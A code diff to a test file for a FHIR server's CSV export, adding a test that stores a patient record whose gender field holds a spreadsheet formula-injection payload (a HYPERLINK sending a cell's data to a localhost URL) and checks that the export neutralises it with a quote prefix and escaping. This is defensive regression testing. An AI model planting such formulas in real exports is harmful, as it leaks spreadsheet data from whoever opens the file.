@@ -14,7 +14,7 @@ describe('CSV Export', () => {
   beforeAll(async () => {
     const config = await loadTestConfig();
     await initApp(app, config);
-    accessToken = await initTestAuth({ strictMode: false });
+    accessToken = await initTestAuth({ project: { strictMode: false } });
   });
 
   afterAll(async () => {
@@ -180,5 +180,27 @@ describe('CSV Export', () => {
       .set('Authorization', 'Bearer ' + accessToken);
     expect(res.status).toBe(400);
     expect(res.body.issue[0].details.text).toEqual('Invalid FHIRPath expression');
+  });
+
+  test('Escape formula string', async () => {
+    // Create a patient that we want to export
+    const res1 = await request(app)
+      .post(`/fhir/R4/Patient`)
+      .set('Authorization', 'Bearer ' + accessToken)
+      .set('Content-Type', ContentType.FHIR_JSON)
+      .send({
+        resourceType: 'Patient',
+        gender: '=HYPERLINK("http://localhost:8181/?data="&F3,"Click Me")',
+      });
+    expect(res1.status).toBe(201);
+
+    const res3 = await request(app)
+      .get(`/fhir/R4/Patient/$csv?_fields=id,gender`)
+      .set('Authorization', 'Bearer ' + accessToken);
+    expect(res3.status).toBe(200);
+    expect(res3.text).toContain(res1.body.id);
+
+    // Note the escaped quotes and single quote prefix
+    expect(res3.text).toContain(`"'=HYPERLINK(""http://localhost:8181/?data=""&F3,""Click Me"")"`);
   });
 });
